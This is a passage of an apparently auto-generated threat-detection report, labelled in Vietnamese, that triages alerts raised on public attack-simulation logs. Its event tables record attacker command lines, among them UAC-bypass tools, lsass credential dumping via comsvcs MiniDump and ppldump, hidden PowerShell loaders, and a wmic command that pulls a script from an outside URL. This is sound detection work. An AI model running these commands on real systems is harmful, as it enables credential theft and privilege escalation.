| 13:50:28 | Sysmon 1 | fubuki.exe | 1.00 | execution | "C:\Users\IEUser\AppData\Local\Temp\fubuki.exe"  |
| 13:50:26 | Sysmon 1 | uacme.exe | 1.00 | privilege-escalation | UACME.exe  38 |
| 13:50:27 | Sysmon 1 | mmc.exe | 1.00 | privilege-escalation | huy32,wf.msc "C:\Users\IEUser\AppData\Local\Temp\kmkze.msc" |
| 13:50:28 | Sysmon 10 | fubuki.exe | 0.99 | privilege-escalation |  |

### A0011 · high · MSEDGEWIN10

- thời gian: 2021-12-07 17:33:01 → 17:33:01 UTC, 7 event, 5 process
- tactic: privilege-escalation (4); lateral-movement (3)
- process: malseclogon.exe (6), svchost.exe (1); user: IEUser, MSEDGEWIN10$
- file log: labels__evtx__Credential Access__tutto_malseclogon.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 5 event)
  - truy cập process lsass (`b_lsass_target`, 1 event) ⚠
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:33:01 | Sysmon 1 | malseclogon.exe | 1.00 | privilege-escalation | MalSeclogon.exe  -p 636 -d 2 |
| 17:33:01 | Sysmon 1 | malseclogon.exe | 1.00 | privilege-escalation | MalSeclogon.exe  -p 636 -d 2 -l 1 |
| 17:33:01 | Security 4703 | malseclogon.exe | 1.00 | lateral-movement |  |
| 17:33:01 | Security 4688 | malseclogon.exe | 1.00 | lateral-movement |  |
| 17:33:01 | Security 4688 | malseclogon.exe | 1.00 | lateral-movement |  |

### A0012 · high · IEWIN7

- thời gian: 2019-04-30 20:26:51 → 20:26:52 UTC, 6 event, 4 process
- tactic: persistence (4); lateral-movement (1); command-and-control (1)
- process: powershell.exe (4), system (1), cmd.exe (1); user: SYSTEM
- file log: labels__evtx__Lateral Movement__LM_sysmon_psexec_smb_meterpreter.json
- **vì sao báo:**
  - lệnh mã hoá base64 (`f_encoded`, 3 event)
  - PowerShell chạy ẩn / bỏ qua execution policy (`f_hidden_ps`, 3 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:26:51 | Sysmon 1 | cmd.exe | 1.00 | persistence | C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]: |
| 20:26:51 | Sysmon 1 | powershell.exe | 1.00 | persistence | powershell.exe  -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:w |
| 20:26:52 | Sysmon 1 | powershell.exe | 1.00 | persistence | "powershell.exe" -noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Obj |
| 20:26:52 | Sysmon 10 | powershell.exe | 0.99 | persistence |  |
| 20:26:52 | Sysmon 3 | powershell.exe | 0.96 | command-and-control |  |

### A0013 · high · IEWIN7

- thời gian: 2019-05-10 13:32:48 → 13:33:29 UTC, 4 event, 3 process
- tactic: privilege-escalation (2); execution (2)
- process: python.exe (2), cmd.exe (1), whoami.exe (1); user: IEUser
- file log: labels__evtx__Privilege Escalation__sysmon_13_1_compmgmtlauncherUACBypass.json
- **vì sao báo:**
  - khoá dùng để vượt UAC (`k_uac_bypass`, 1 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:33:29 | Sysmon 1 | whoami.exe | 1.00 | execution | whoami  /priv |
| 13:32:48 | Sysmon 13 | python.exe | 1.00 | privilege-escalation |  |
| 13:32:54 | Sysmon 1 | cmd.exe | 1.00 | execution | "c:\Windows\System32\cmd.exe"  |
| 13:32:48 | Sysmon 1 | python.exe | 1.00 | privilege-escalation | python  winpwnage.py -u uac -i 9 -p c:\Windows\System32\cmd.exe |

### A0014 · high · MSEDGEWIN10

- thời gian: 2019-08-30 12:54:07 → 12:54:08 UTC, 4 event, 2 process
- tactic: persistence (2); execution (1); defense-evasion (1)
- process: rundll32.exe (3), cscript.exe (1); user: IEUser
- file log: labels__evtx__Credential Access__sysmon_10_1_memdump_comsvcs_minidump.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 1 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 12:54:08 | Sysmon 1 | rundll32.exe | 1.00 | persistence | rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4868 C:\Windows\System32\notepad.bin full |
| 12:54:07 | Sysmon 1 | cscript.exe | 1.00 | execution | cscript  c:\ProgramData\memdump.vbs notepad.exe |
| 12:54:08 | Sysmon 10 | rundll32.exe | 0.80 | defense-evasion |  |
| 12:54:08 | Sysmon 11 | rundll32.exe | 0.62 | persistence |  |

### A0015 · high · IEWIN7

- thời gian: 2019-05-23 16:48:35 → 16:49:08 UTC, 3 event, 3 process
- tactic: execution (2); privilege-escalation (1)
- process: spoolsv.exe (1), wmic.exe (1), cmd.exe (1); user: IEUser
- file log: labels__evtx__Execution__exec_wmic_xsl_internet_sysmon_3_1_11.json
- **vì sao báo:**
  - tải file / script từ mạng (`f_download`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 16:49:08 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\System32\cmd.exe"  |
| 16:49:05 | Sysmon 1 | wmic.exe | 1.00 | execution | wmic  process list /format:"https://a.uguu.se/x50IGVBRfr55_test.xsl" |
| 16:48:35 | Sysmon 13 | spoolsv.exe | 0.52 | privilege-escalation |  |

### A0016 · high · PC01.example.corp

- thời gian: 2019-03-19 20:35:24 → 21:41:18 UTC, 101 event, 92 process
- tactic: privilege-escalation (41); command-and-control (26); persistence (20); execution (11); defense-evasion (3)
- process: sdbinst.exe (17), calc.exe (11), osk.exe (11), utilman.exe (11), ui0detect.exe (9), logonui.exe (4); user: LOCAL SERVICE, SYSTEM, user01
- file log: labels__evtx__Persistence__persistence_sysmon_11_13_1_shime_appfix.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)
  - khoá dùng để vượt UAC (`k_uac_bypass`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:42:38 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\System32\cmd.exe" /c msg *  "hello from run key" |
| 21:41:17 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | C:\Windows\system32\cmd.EXE /c malwr.vbs |
| 20:36:04 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | cmd.exe |
| 20:36:04 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | cmd.exe |
| 20:42:00 | Sysmon 1 | slui.exe | 1.00 | privilege-escalation | "C:\Windows\system32\slui.exe" |

### A0017 · high · PC01.example.corp

- thời gian: 2019-03-19 23:13:02 → 23:23:40 UTC, 44 event, 44 process
- tactic: privilege-escalation (27); command-and-control (9); execution (4); persistence (3); defense-evasion (1)
- process: calc.exe (11), cmd.exe (3), slui.exe (3), ui0detect.exe (3), smss.exe (2), csrss.exe (2); user: LOCAL SERVICE, SYSTEM, user01
- file log: labels__evtx__Persistence__persistence_sysmon_11_13_1_shime_appfix.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 23:18:42 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\System32\cmd.exe" /c msg *  "hello from run key" |
| 23:13:38 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | cmd.exe |
| 23:13:38 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | cmd.exe |
| 23:14:12 | Sysmon 1 | slui.exe | 1.00 | privilege-escalation | "C:\Windows\system32\slui.exe" |
| 23:18:42 | Sysmon 1 | psexesvc.exe | 1.00 | execution | "C:\Windows\PSEXESVC.exe"  |

### A0018 · high · LAPTOP-JU4M3I0E

- thời gian: 2021-01-26 13:21:13 → 13:21:33 UTC, 18 event, 5 process
- tactic: lateral-movement (11); privilege-escalation (4); execution (2); persistence (1)
- process: msbuild.exe (14), cmd.exe (1), powershell.exe (1), notepad.exe (1), mmc.exe (1); user: bouss
- file log: labels__evtx__Execution__execution_evasion_visual_studio_prebuild_event.json
- **vì sao báo:**
  - ghi file thực thi / script (`f_drop_exec`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:21:14 | Sysmon 1 | powershell.exe | 1.00 | privilege-escalation | powershell.exe   start-process notepad.exe |
| 13:21:13 | Sysmon 11 | msbuild.exe | 0.99 | lateral-movement |  |
| 13:21:13 | Sysmon 11 | msbuild.exe | 0.99 | lateral-movement |  |
| 13:21:13 | Sysmon 1 | cmd.exe | 0.99 | execution | "C:\windows\system32\cmd.exe"  /Q /D /C C:\Users\bouss\AppData\Local\Temp\tmpf890f11830e143ada2d718f |
| 13:21:14 | Sysmon 1 | notepad.exe | 0.99 | execution | "C:\windows\system32\notepad.exe"  |

### A0019 · high · IEWIN7

- thời gian: 2019-05-11 17:57:49 → 17:58:55 UTC, 17 event, 10 process
- tactic: persistence (7); execution (6); privilege-escalation (3); credential-access (1)
- process: wmic.exe (6), python.exe (4), cmd.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Persistence__sysmon_20_21_1_CommandLineEventConsumer.json
- **vì sao báo:**
  - WMI event subscription (persistence) (`f_wmi_sub`, 8 event) ⚠
  - đọc bộ nhớ process khác (`b_vm_read`, 2 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 1 event)
  - truy cập process lsass (`b_lsass_target`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:57:49 | Sysmon 1 | python.exe | 1.00 | privilege-escalation | python  winpwnage.py -u elevate -5 -p c:\Windows\System32\cmd.exe |
| 17:58:22 | Sysmon 1 | python.exe | 1.00 | privilege-escalation | python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe |
| 17:58:54 | Sysmon 20 |  | 1.00 | persistence |  |
| 17:58:23 | Sysmon 20 |  | 1.00 | persistence |  |
| 17:58:55 | Sysmon 21 |  | 1.00 | persistence |  |

### A0020 · high · IEWIN7

- thời gian: 2019-05-09 02:52:18 → 02:52:23 UTC, 15 event, 13 process
- tactic: execution (10); privilege-escalation (3); defense-evasion (2)
- process: wusa.exe (8), cmd.exe (4), makecab.exe (2), powershell.exe (1); user: IEUser
- file log: labels__evtx__Privilege Escalation__sysmon_11_1_15_WScriptBypassUAC.json
- **vì sao báo:**
  - ghi file thực thi / script (`f_drop_exec`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 02:52:19 | Sysmon 1 | wusa.exe | 1.00 | execution | "C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\uf3huvkczgk.tmp /extract:C:\Windo |
| 02:52:21 | Sysmon 1 | wusa.exe | 1.00 | execution | "C:\Windows\system32\wusa.exe"  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windo |
| 02:52:18 | Sysmon 11 | powershell.exe | 1.00 | privilege-escalation |  |
| 02:52:23 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | "C:\Windows\system32\cmd.exe"  /C "C:\Windows\wscript.exe "C:\Users\IEUser\AppData:tghjx5xz2ky.vbs"" |
| 02:52:18 | Sysmon 1 | makecab.exe | 1.00 | execution | "C:\Windows\System32\makecab.exe" C:\Users\IEUser\AppData\Local\Temp\wscript.exe.manifest C:\Users\I |

### A0021 · high · PC01.example.corp

- thời gian: 2019-03-19 17:22:24 → 17:41:09 UTC, 13 event, 13 process
- tactic: privilege-escalation (6); command-and-control (4); persistence (1); execution (1); defense-evasion (1)
- process: ui0detect.exe (4), osk.exe (2), utilman.exe (2), logonui.exe (2), slui.exe (1), cmd.exe (1); user: SYSTEM, user01
- file log: labels__evtx__Persistence__persistence_sysmon_11_13_1_shime_appfix.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:41:08 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | C:\Windows\system32\cmd.EXE /c malwr.vbs |
| 17:22:24 | Sysmon 1 | osk.exe | 0.99 | persistence | "C:\Windows\system32\osk.exe"  |
| 17:22:24 | Sysmon 1 | osk.exe | 0.98 | execution | "C:\Windows\System32\osk.exe"  |
| 17:31:03 | Sysmon 1 | ui0detect.exe | 0.96 | privilege-escalation | UI0Detect.exe 224 |
| 17:26:03 | Sysmon 1 | ui0detect.exe | 0.96 | privilege-escalation | UI0Detect.exe 224 |

### A0022 · high · WORKSTATION5.theshire.local

- thời gian: 2020-10-12 22:33:11 → 22:34:38 UTC, 107 event, 11 process
- tactic: lateral-movement (36); execution (30); privilege-escalation (16); persistence (12); defense-evasion (6); discovery (5); command-and-control (2)
- process: notepad.exe (52), wuauclt.exe (11), cmd.exe (10), grunthttp.exe (8), conhost.exe (7); user: pgustavo
- file log: labels__mordor__defense_evasion__host__covenant_lolbin_wuauclt_createremotethread__covenant_lolbin_wuauclt_createremotethread_2020-10-12183248.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 8 event)
  - khoá Winlogon (`k_winlogon`, 6 event)
  - mở process với toàn quyền (`b_full_access`, 4 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 4 event)
  - khoá cấu hình service (`k_services`, 2 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - nạp module không ký (`b_unsigned_module`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:34:38 | Sysmon 1 | cmd.exe | 1.00 | defense-evasion | "cmd.exe" /c C:\Windows\System32\wuauclt.exe /UpdateDeploymentProvider C:\ProgramData\SimpleInjectio |
| 22:33:11 | Sysmon 11 | grunthttp.exe | 1.00 | defense-evasion |  |
| 22:34:38 | Sysmon 1 | wuauclt.exe | 1.00 | defense-evasion | C:\Windows\System32\wuauclt.exe  /UpdateDeploymentProvider C:\ProgramData\SimpleInjection.dll /RunHa |
| 22:34:38 | Sysmon 1 | notepad.exe | 0.99 | defense-evasion | c:\windows\system32\notepad.exe |
| 22:34:38 | Security 4673 | grunthttp.exe | 0.99 | lateral-movement |  |

### A0023 · high · MSEDGEWIN10

- thời gian: 2019-08-03 11:23:15 → 11:23:17 UTC, 11 event, 10 process
- tactic: privilege-escalation (8); persistence (2); execution (1)
- process: werfault.exe (3), consent.exe (2), wusa.exe (2), cmd.exe (2), uacme.exe (1), explorer.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Privilege Escalation__Sysmon_UACME_30.json
- **vì sao báo:**
  - nạp module không ký (`b_unsigned_module`, 2 event)
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 1 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 11:23:15 | Sysmon 1 | uacme.exe | 1.00 | privilege-escalation | UACME.exe  30 |
| 11:23:16 | Sysmon 1 | wusa.exe | 1.00 | privilege-escalation | "C:\Windows\syswow64\wusa.exe"  |
| 11:23:17 | Sysmon 1 | werfault.exe | 1.00 | execution | C:\Windows\SysWOW64\WerFault.exe -u -p 6312 -s 80 |
| 11:23:17 | Sysmon 1 | wusa.exe | 1.00 | privilege-escalation | "C:\Windows\syswow64\wusa.exe"  |
| 11:23:17 | Sysmon 1 | cmd.exe | 1.00 | persistence | "C:\Windows\system32\cmd.exe" |

### A0024 · high · IEWIN7

- thời gian: 2019-05-26 04:01:42 → 04:01:47 UTC, 9 event, 4 process
- tactic: privilege-escalation (6); defense-evasion (2); persistence (1)
- process: jjs.exe (7), svchost.exe (1), spoolsv.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Defense Evasion__apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 7 event)
  - nạp module không ký (`b_unsigned_module`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 04:01:42 | Sysmon 1 | jjs.exe | 1.00 | privilege-escalation | "C:\Users\IEUser\Desktop\info.rar\jjs.exe" |
| 04:01:42 | Sysmon 1 | jjs.exe | 1.00 | persistence | "C:\Users\IEUser\Desktop\info.rar\jjs.exe"  |
| 04:01:42 | Sysmon 7 | jjs.exe | 1.00 | defense-evasion |  |
| 04:01:42 | Sysmon 7 | jjs.exe | 1.00 | defense-evasion |  |
| 04:01:43 | Sysmon 8 | jjs.exe | 0.99 | privilege-escalation |  |

### A0025 · high · MSEDGEWIN10

- thời gian: 2020-05-02 18:01:52 → 18:01:57 UTC, 7 event, 5 process
- tactic: privilege-escalation (6); persistence (1)
- process: printspoofer.exe (4), system (1), powershell.exe (1), whoami.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Privilege Escalation__privesc_seimpersonate_tosys_spoolsv_sysmon_17_18.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 4 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:01:54 | Sysmon 18 | printspoofer.exe | 1.00 | privilege-escalation |  |
| 18:01:54 | Sysmon 17 | printspoofer.exe | 1.00 | privilege-escalation |  |
| 18:01:54 | Sysmon 1 | printspoofer.exe | 0.99 | privilege-escalation | PrintSpoofer.exe  -i -c powershell.exe |
| 18:01:54 | Sysmon 1 | powershell.exe | 0.99 | privilege-escalation | powershell.exe |
| 18:01:57 | Sysmon 1 | whoami.exe | 0.98 | persistence | "C:\Windows\system32\whoami.exe" |

### A0026 · high · MSEDGEWIN10

- thời gian: 2020-02-10 10:08:24 → 10:08:27 UTC, 3 event, 1 process
- tactic: credential-access (2); defense-evasion (1)
- process: ppldump.exe (3); user: IEUser
- file log: labels__evtx__Defense Evasion__DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - truy cập process lsass (`b_lsass_target`, 1 event) ⚠
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 10:08:24 | Sysmon 1 | ppldump.exe | 1.00 | credential-access | ppldump.exe  -p lsass.exe -o a.png |
| 10:08:24 | Sysmon 10 | ppldump.exe | 0.98 | credential-access |  |
| 10:08:27 | Sysmon 5 | ppldump.exe | 0.95 | defense-evasion |  |

### A0027 · high · WORKSTATION5

- thời gian: 2020-10-22 05:54:21 → 05:54:28 UTC, 265 event, 14 process
- tactic: defense-evasion (227); execution (21); persistence (7); privilege-escalation (4); command-and-control (4); lateral-movement (1); discovery (1)
- process: svchost.exe (170), powershell.exe (41), cmstp.exe (18), cmd.exe (8), whoami.exe (8), conhost.exe (7); user: wardog
- file log: labels__mordor__defense_evasion__host__psh_cmstp_execution_bypassuac__psh_cmstp_execution_bypassuac_2020-10-2201543213.json
- **vì sao báo:**
  - khoá cấu hình service (`k_services`, 16 event)
  - mở process với toàn quyền (`b_full_access`, 3 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 3 event)
  - kết nối ra IP public (`b_public_dst`, 2 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 2 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 05:54:22 | Security 4658 | powershell.exe | 1.00 | defense-evasion |  |
| 05:54:22 | Security 4658 | powershell.exe | 1.00 | defense-evasion |  |
| 05:54:28 | Security 4688 | whoami.exe | 1.00 | defense-evasion | whoami |
| 05:54:22 | Security 4656 | powershell.exe | 1.00 | defense-evasion |  |
| 05:54:23 | Security 4688 | cmstp.exe | 1.00 | defense-evasion | "C:\windows\system32\cmstp.exe" /s C:\ProgramData\T1218.003_uacbypass.inf /au |

### A0028 · high · WORKSTATION6.theshire.local

- thời gian: 2020-08-06 07:56:29 → 07:56:42 UTC, 116 event, 6 process
- tactic: lateral-movement (65); execution (32); privilege-escalation (15); command-and-control (2); defense-evasion (2)
- process: grunthttp2.exe (69), wmiprvse.exe (8), conhost.exe (8), services.exe (6); user: WORKSTATION6$, pgustavo, sbeavers
- file log: labels__mordor__lateral_movement__host__covenant_sharpwmi_create_dcerpc_wmi__covenant_sharpwmi_create_dcerpc_wmi_2020-08-06035621.json
- **vì sao báo:**
  - khoá Winlogon (`k_winlogon`, 6 event)
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 2 event)
  - can thiệp Defender / firewall (`f_av_tamper`, 2 event) ⚠
  - nạp module không ký (`b_unsigned_module`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 07:56:41 | Sysmon 1 | grunthttp2.exe | 1.00 | execution | "C:\\Windows\\System32\\GruntHTTP2.exe" |
| 07:56:41 | Security 4674 | wmiprvse.exe | 0.99 | lateral-movement |  |
| 07:56:41 | Security 4674 | wmiprvse.exe | 0.99 | lateral-movement |  |
| 07:56:41 | Security 4674 | grunthttp2.exe | 0.98 | lateral-movement |  |
| 07:56:42 | Security 4674 | grunthttp2.exe | 0.98 | lateral-movement |  |

### A0029 · high · MSEDGEWIN10

- thời gian: 2021-06-09 04:58:49 → 04:58:49 UTC, 1 event, 1 process
- tactic: persistence (1)
- process: 
- file log: labels__evtx__Credential Access__LsassSilentProcessExit_process_exit_monitor_3001_lsass.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 1 event)
  - khoá IFEO / SilentProcessExit (`k_ifeo`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 04:58:49 | ProcessExitMonitor 3001 |  | 1.00 | persistence |  |

### A0030 · high · MSEDGEWIN10

- thời gian: 2021-06-09 05:18:11 → 05:18:11 UTC, 1 event, 1 process
- tactic: persistence (1)
- process: 
- file log: labels__evtx__Credential Access__LsassSilentProcessExit_process_exit_monitor_3001_lsass.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 1 event)
  - khoá IFEO / SilentProcessExit (`k_ifeo`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 05:18:11 | ProcessExitMonitor 3001 |  | 1.00 | persistence |  |

### A0031 · high · LAPTOP-JU4M3I0E

- thời gian: 2020-11-26 17:38:11 → 17:38:11 UTC, 6 event, 2 process
- tactic: privilege-escalation (4); persistence (1); execution (1)
- process: byeintegrity5-uac.exe (5), cmd.exe (1); user: bouss
- file log: labels__evtx__Privilege Escalation__sysmon_uacbypass_CDSSync_schtask_hijack_byeintegrity5.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 5 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:38:11 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\windows\system32\cmd.exe" |
| 17:38:11 | Sysmon 11 | byeintegrity5-uac.exe | 1.00 | privilege-escalation |  |
| 17:38:11 | Sysmon 12 | byeintegrity5-uac.exe | 1.00 | privilege-escalation |  |
| 17:38:11 | Sysmon 13 | byeintegrity5-uac.exe | 1.00 | privilege-escalation |  |
| 17:38:11 | Sysmon 1 | byeintegrity5-uac.exe | 1.00 | privilege-escalation | byeintegrity5-uac.exe |

### A0032 · high · MSEDGEWIN10

- thời gian: 2020-03-21 21:45:04 → 21:45:04 UTC, 3 event, 2 process
- tactic: defense-evasion (1); persistence (1); execution (1)
- process: powershell.exe (2), cmd.exe (1); user: IEUser
- file log: labels__evtx__Defense Evasion__sysmon_10_1_ppid_spoofing.json
- **vì sao báo:**
  - mở process với toàn quyền (`b_full_access`, 2 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 21:45:04 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\windows\system32\cmd.exe" |
| 21:45:04 | Sysmon 10 | powershell.exe | 1.00 | persistence |  |
| 21:45:04 | Sysmon 10 | powershell.exe | 0.95 | defense-evasion |  |

### A0033 · high · WORKSTATION5.theshire.local

- thời gian: 2020-08-05 06:10:01 → 06:10:09 UTC, 11 event, 3 process
- tactic: lateral-movement (6); command-and-control (2); execution (2); discovery (1)
- process: grunthttp.exe (9); user: pgustavo
- file log: labels__mordor__credential_access__host__covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges__covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges_2020-08-05020926.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 9 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 06:10:01 | Sysmon 3 | grunthttp.exe | 1.00 | discovery |  |
| 06:10:01 | Sysmon 3 | grunthttp.exe | 1.00 | lateral-movement |  |
| 06:10:02 | Security 4673 | grunthttp.exe | 1.00 | lateral-movement |  |
| 06:10:02 | Security 4673 | grunthttp.exe | 1.00 | lateral-movement |  |
| 06:10:02 | Security 5156 | grunthttp.exe | 0.99 | lateral-movement |  |

### A0034 · high · WORKSTATION5.theshire.local

- thời gian: 2020-08-06 07:56:22 → 07:56:41 UTC, 9 event, 3 process
- tactic: execution (4); discovery (3); command-and-control (1); lateral-movement (1)
- process: grunthttp.exe (5); user: pgustavo
- file log: labels__mordor__lateral_movement__host__covenant_sharpwmi_create_dcerpc_wmi__covenant_sharpwmi_create_dcerpc_wmi_2020-08-06035621.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 5 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 07:56:41 | Sysmon 3 | grunthttp.exe | 1.00 | discovery |  |
| 07:56:41 | Security 5156 | grunthttp.exe | 0.99 | lateral-movement |  |
| 07:56:41 | Security 5158 | grunthttp.exe | 0.97 | command-and-control |  |
| 07:56:41 | Sysmon 17 | grunthttp.exe | 0.95 | discovery |  |
| 07:56:41 | Sysmon 18 | grunthttp.exe | 0.94 | discovery |  |

### A0035 · high · MSEDGEWIN10

- thời gian: 2020-10-01 18:35:02 → 18:35:02 UTC, 2 event, 2 process
- tactic: privilege-escalation (1); defense-evasion (1)
- process: poc.exe (2); user: IEUser
- file log: labels__evtx__Privilege Escalation__eop_appcontainer_il_broker_filewrite.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:35:02 | Sysmon 1 | poc.exe | 1.00 | privilege-escalation | POC.exe |
| 18:35:02 | Sysmon 1 | poc.exe | 0.98 | defense-evasion | Program |

### A0036 · high · MSEDGEWIN10

- thời gian: 2020-08-12 13:04:27 → 13:06:08 UTC, 17 event, 12 process
- tactic: privilege-escalation (13); persistence (3); execution (1)
- process: cmd.exe (9), spoolsv.exe (6), powershell.exe (1), whoami.exe (1); user: IEUser, SYSTEM
- file log: labels__evtx__Privilege Escalation__privesc_spoolsv_spl_file_write_sysmon11.json
- **vì sao báo:**
  - ghi file thực thi / script (`f_drop_exec`, 6 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:05:36 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\system32\cmd.exe"  |
| 13:04:28 | Sysmon 11 | powershell.exe | 1.00 | privilege-escalation |  |
| 13:05:16 | Sysmon 1 | cmd.exe | 0.99 | privilege-escalation | cmd.exe |
| 13:06:08 | Sysmon 1 | whoami.exe | 0.99 | persistence | whoami |
| 13:06:04 | Sysmon 1 | cmd.exe | 0.99 | privilege-escalation | "C:\Windows\system32\cmd.exe" |

### A0037 · high · WORKSTATION5.theshire.local

- thời gian: 2020-08-06 07:20:03 → 07:20:24 UTC, 9 event, 2 process
- tactic: lateral-movement (4); command-and-control (3); discovery (2)
- process: grunthttp.exe (9); user: pgustavo
